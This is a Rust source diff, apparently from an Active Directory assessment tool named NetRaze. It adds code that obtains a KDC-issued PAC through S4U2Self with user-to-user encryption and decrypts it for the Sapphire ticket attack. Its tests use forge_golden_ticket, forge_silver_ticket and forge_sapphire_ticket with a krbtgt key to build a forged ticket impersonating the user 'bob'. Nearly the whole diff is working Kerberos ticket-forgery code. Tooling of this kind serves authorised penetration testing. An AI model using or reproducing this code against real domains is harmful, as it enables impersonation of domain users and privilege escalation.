@@ -16,11 +16,11 @@ use picky_krb::constants::key_usages::{
     TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR_CKSUM,
 };
 use picky_krb::constants::types::{
-    AP_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_TGS_REQ_TYPE, TGS_REQ_MSG_TYPE,
+    AP_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, NT_UNKNOWN, PA_TGS_REQ_TYPE, TGS_REQ_MSG_TYPE,
 };
 use picky_krb::data_types::{
-    ApOptions, Authenticator, AuthenticatorInner, Checksum, EncryptedData, KerberosFlags,
-    KerberosStringAsn1, PaData, PaPacOptions, PrincipalName, Ticket,
+    ApOptions, Authenticator, AuthenticatorInner, AuthorizationData, Checksum, EncTicketPart,
+    EncryptedData, KerberosFlags, KerberosStringAsn1, PaData, PaPacOptions, PrincipalName, Ticket,
 };
 use picky_krb::messages::{ApReq, ApReqInner, KdcReq, KdcReqBody, TgsReq};
 use rand::rngs::OsRng;
@@ -32,11 +32,11 @@ use super::assessment::{
     ServiceTicket, decode_tgs_reply, finish_service_tgs_exchange, validate_spn,
 };
 use super::client::{
-    encode_der, integer_i32, integer_u32, kerberos_string, principal, validate_realm,
-    validate_username,
+    encode_der, encrypted_data_type, integer_as_i32, integer_i32, integer_u32, kerberos_string,
+    principal, principal_name, validate_realm, validate_username,
 };
 use super::crypto::keyed_checksum;
-use super::{KerberosClient, KerberosError, TicketGrantingTicket, encrypt};
+use super::{KerberosClient, KerberosError, TicketGrantingTicket, decrypt, encrypt};
 
 const KERBEROS_VERSION: i32 = 5;
 const PA_FOR_USER_TYPE: i32 = 129;
@@ -44,6 +44,8 @@ const PA_PAC_OPTIONS_TYPE: i32 = 167;
 const PA_FOR_USER_KEY_USAGE: i32 = 17;
 const FORWARDABLE_TICKET_FLAG: u32 = 0x4000_0000;
 const TEN_HOURS: time::Duration = time::Duration::hours(10);
+const TICKET_KEY_USAGE: i32 = 2;
+const MAX_SAPPHIRE_PAC_SIZE: usize = 16 * 1024 * 1024;
 
 /// Delegation policy requested from the KDC during S4U2Proxy.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -66,6 +68,45 @@ pub struct S4uEvidenceTicket {
     requesting_service: String,
     impersonated_principal: String,
     impersonated_realm: String,
+}
+
+/// KDC-issued PAC obtained through S4U2Self+U2U for Sapphire construction.
+///
+/// The raw PAC is intentionally private: callers can inspect only the
+/// validated identity metadata and can pass the evidence to
+/// [`super::forge_sapphire_ticket`].
+#[derive(Clone)]
+pub struct SapphirePacEvidence {
+    pac: Vec<u8>,
+    impersonated_principal: String,
+    realm: String,
+}
+
+impl core::fmt::Debug for SapphirePacEvidence {
+    fn fmt(&self, formatter: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
+        formatter
+            .debug_struct("SapphirePacEvidence")
+            .field("impersonated_principal", &self.impersonated_principal)
+            .field("realm", &self.realm)
+            .field("pac_length", &self.pac.len())
+            .finish_non_exhaustive()
+    }
+}
+
+impl SapphirePacEvidence {
+    #[must_use]
+    pub fn impersonated_principal(&self) -> &str {
+        &self.impersonated_principal
+    }
+
+    #[must_use]
+    pub fn realm(&self) -> &str {
+        &self.realm
+    }
+
+    pub(crate) fn pac_bytes(&self) -> &[u8] {
+        &self.pac
+    }
 }
 
 impl core::fmt::Debug for S4uEvidenceTicket {
@@ -173,6 +214,52 @@ impl KerberosClient {
         })
     }
 
+    /// Request S4U2Self with `ENC-TKT-IN-SKEY` and extract the returned PAC.
+    /// The KDC encrypts the evidence ticket with the supplied TGT session key,
+    /// which lets NetRaze validate the impersonated identity before the PAC is
+    /// accepted for Sapphire construction.
+    pub async fn request_sapphire_pac(
+        &self,
+        tgt: &TicketGrantingTicket,
+        own_service_principal: &str,
+        impersonated_principal: &str,
+    ) -> Result<SapphirePacEvidence, KerberosError> {
+        validate_s4u_tgt(self, tgt)?;
+        validate_username(own_service_principal)?;
+        validate_username(impersonated_principal)?;
+        if !own_service_principal.eq_ignore_ascii_case(tgt.client_principal()) {
+            return Err(KerberosError::InvalidMessage(
+                "S4U2Self+U2U service identity does not match the TGT client".to_owned(),
+            ));
+        }
+        let now = OffsetDateTime::now_utc();
+        validate_ticket_lifetime(tgt.valid_from_unix(), tgt.valid_until_unix(), now)?;
+        let nonce = OsRng.r#gen::<u32>() & 0x7fff_ffff;
+        let request = build_s4u_tgs_req(
+            tgt,
+            principal(NT_UNKNOWN, &[own_service_principal])?,
+            tgt.kdc_realm(),
+            nonce,
+            now,
+            [0x40, 0x81, 0, 0x18],
+            vec![pa_for_user(tgt, impersonated_principal, tgt.realm())?],
+            vec![tgt.ticket.clone()],
+            &mut OsRng,
+        )?;
+        let response = self.transport.exchange(&encode_der(&request)?).await?;
+        let reply = decode_tgs_reply(&response)?;
+        let ticket = finish_service_tgs_exchange(
+            reply,
+            tgt,
+            own_service_principal,
+            tgt.kdc_realm(),
+            impersonated_principal,
+            tgt.realm(),
+            nonce,
+        )?;
+        extract_sapphire_pac(tgt, &ticket, impersonated_principal, tgt.realm())
+    }
+
     /// Exchange a validated S4U2Self evidence ticket for one explicitly named
     /// service ticket. KDC authorization failures are returned unchanged and
     /// are never worked around by modifying directory state.
@@ -255,6 +342,75 @@ impl KerberosClient {
         self.request_s4u2proxy(tgt, &evidence, target_service_principal, mode)
             .await
     }
+}
+
+fn extract_sapphire_pac(
+    tgt: &TicketGrantingTicket,
+    evidence: &ServiceTicket,
+    expected_principal: &str,
+    expected_realm: &str,
+) -> Result<SapphirePacEvidence, KerberosError> {
+    let encryption_type = encrypted_data_type(&evidence.ticket.0.enc_part.0)?;
+    if encryption_type != tgt.session_encryption_type() {
+        return Err(KerberosError::InvalidMessage(
+            "S4U2Self+U2U ticket was not encrypted with the TGT session profile".to_owned(),
+        ));
+    }
+    let plaintext = decrypt(
+        encryption_type,
+        &tgt.session_key,
+        TICKET_KEY_USAGE,
+        &evidence.ticket.0.enc_part.0.cipher.0.0,
+    )?;
+    let encrypted: EncTicketPart = picky_asn1_der::from_bytes(&plaintext).map_err(|error| {
+        KerberosError::InvalidMessage(format!("invalid S4U2Self+U2U EncTicketPart: {error}"))
+    })?;
+    let principal = principal_name(&encrypted.0.cname.0);
+    let realm = encrypted.0.crealm.0.0.to_string();
+    if !principal.eq_ignore_ascii_case(expected_principal)
+        || !realm.eq_ignore_ascii_case(expected_realm)
+    {
+        return Err(KerberosError::InvalidMessage(
+            "S4U2Self+U2U PAC ticket identity does not match the requested principal".to_owned(),
+        ));
+    }
+    let outer = encrypted.0.authorization_data.0.as_ref().ok_or_else(|| {
+        KerberosError::InvalidMessage(
+            "S4U2Self+U2U ticket contains no authorization data".to_owned(),
+        )
+    })?;
+    let mut pac = None;
+    for outer_entry in &outer.0.0 {
+        if integer_as_i32(&outer_entry.ad_type.0) != Some(1) {
+            continue;
+        }
+        let inner: AuthorizationData = picky_asn1_der::from_bytes(&outer_entry.ad_data.0.0)
+            .map_err(|error| {
+                KerberosError::InvalidMessage(format!("invalid AD-IF-RELEVANT value: {error}"))
+            })?;
+        for inner_entry in inner.0 {
+            if integer_as_i32(&inner_entry.ad_type.0) == Some(128)
+                && pac.replace(inner_entry.ad_data.0.0).is_some()
+            {
+                return Err(KerberosError::InvalidMessage(
+                    "S4U2Self+U2U ticket contains more than one PAC".to_owned(),
+                ));
+            }
+        }
+    }
+    let pac = pac.ok_or_else(|| {
+        KerberosError::InvalidMessage("S4U2Self+U2U ticket contains no PAC".to_owned())
+    })?;
+    if pac.len() > MAX_SAPPHIRE_PAC_SIZE {
+        return Err(KerberosError::InvalidMessage(format!(
+            "S4U2Self+U2U PAC exceeds the {MAX_SAPPHIRE_PAC_SIZE}-byte limit"
+        )));
+    }
+    Ok(SapphirePacEvidence {
+        pac,
+        impersonated_principal: principal,
+        realm,
+    })
 }
 
 #[allow(clippy::too_many_arguments)]
@@ -451,6 +607,10 @@ fn validate_delegation_mode(
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::kerberos::{
+        TicketConstructionIdentity, TicketConstructionKey, TicketConstructionLifetime,
+        TicketConstructionOptions, forge_golden_ticket, forge_sapphire_ticket, forge_silver_ticket,
+    };
     use picky_krb::data_types::TicketInner;
 
     fn test_tgt(
@@ -555,6 +715,97 @@ mod tests {
             vec![evidence]
         );
         assert_eq!(request.0.padata.0.as_ref().unwrap().0.0.len(), 2);
+    }
+
+    #[test]
+    fn u2u_request_sets_enc_tkt_in_skey_and_supplies_the_tgt() {
+        let tgt = test_tgt(
+            super::super::KerberosEncryptionType::Rc4Hmac,
+            vec![0x22; 16],
+        );
+        let request = build_s4u_tgs_req(
+            &tgt,
+            principal(NT_UNKNOWN, &["service$"]).unwrap(),
+            "EXAMPLE.TEST",
+            9,
+            OffsetDateTime::from_unix_timestamp(1_700_000_100).unwrap(),
+            [0x40, 0x81, 0, 0x18],
+            vec![pa_for_user(&tgt, "bob", "EXAMPLE.TEST").unwrap()],
+            vec![tgt.ticket.clone()],
+            &mut OsRng,
+        )
+        .unwrap();
+        assert_eq!(
+            request.0.req_body.0.kdc_options.0.0.as_bytes(),
+            &[0, 0x40, 0x81, 0, 0x18]
+        );
+        assert_eq!(
+            request
+                .0
+                .req_body
+                .0
+                .additional_tickets
+                .0
+                .as_ref()
+                .unwrap()
+                .0
+                .0,
+            vec![tgt.ticket]
+        );
+    }
+
+    #[test]
+    fn sapphire_uses_only_validated_u2u_pac_evidence() {
+        let construction_options = TicketConstructionOptions {
+            realm: "EXAMPLE.TEST".to_owned(),
+            lifetime: TicketConstructionLifetime {
+                issued_at_unix: 1_700_000_000,
+                valid_from_unix: 1_700_000_000,
+                valid_until_unix: 1_700_036_000,
+                renewable_until_unix: Some(1_700_604_800),
+                ticket_flags: 0x40e1_0000,
+            },
+            kvno: Some(2),
+        };
+        let identity = |username: &str, rid| TicketConstructionIdentity {
+            username: username.to_owned(),
+            user_rid: rid,
+            primary_group_rid: 513,
+            group_rids: vec![513],
+            domain_sid: "S-1-5-21-111-222-333".to_owned(),
+            logon_server: "DC01".to_owned(),
+            logon_domain: "EXAMPLE".to_owned(),
+            extra_sids: Vec::new(),
+        };
+        let krbtgt_key = TicketConstructionKey::Rc4([0x55; 16]);
+        let template = forge_golden_ticket(
+            &identity("service$", 1_101),
+            &construction_options,
+            &krbtgt_key,
+        )
+        .unwrap();
+        let u2u_key = TicketConstructionKey::Rc4(template.session_key.clone().try_into().unwrap());
+        let kdc_ticket = forge_silver_ticket(
+            &identity("bob", 1_102),
+            &construction_options,
+            "host/service.example.test",
+            &u2u_key,
+            &u2u_key,
+        )
+        .unwrap();
+        let evidence = extract_sapphire_pac(&template, &kdc_ticket, "bob", "EXAMPLE.TEST").unwrap();
+        let sapphire = forge_sapphire_ticket(&template, &evidence, &krbtgt_key).unwrap();
+        assert_eq!(sapphire.client_principal(), "bob");
+        assert_eq!(sapphire.session_key, template.session_key);
+        let plaintext = decrypt(
+            super::super::KerberosEncryptionType::Rc4Hmac,
+            &[0x55; 16],
+            TICKET_KEY_USAGE,
+            &sapphire.ticket.0.enc_part.0.cipher.0.0,
+        )
+        .unwrap();
+        let encrypted: EncTicketPart = picky_asn1_der::from_bytes(&plaintext).unwrap();
+        assert_eq!(principal_name(&encrypted.0.cname.0), "bob");
     }
 
     #[test]
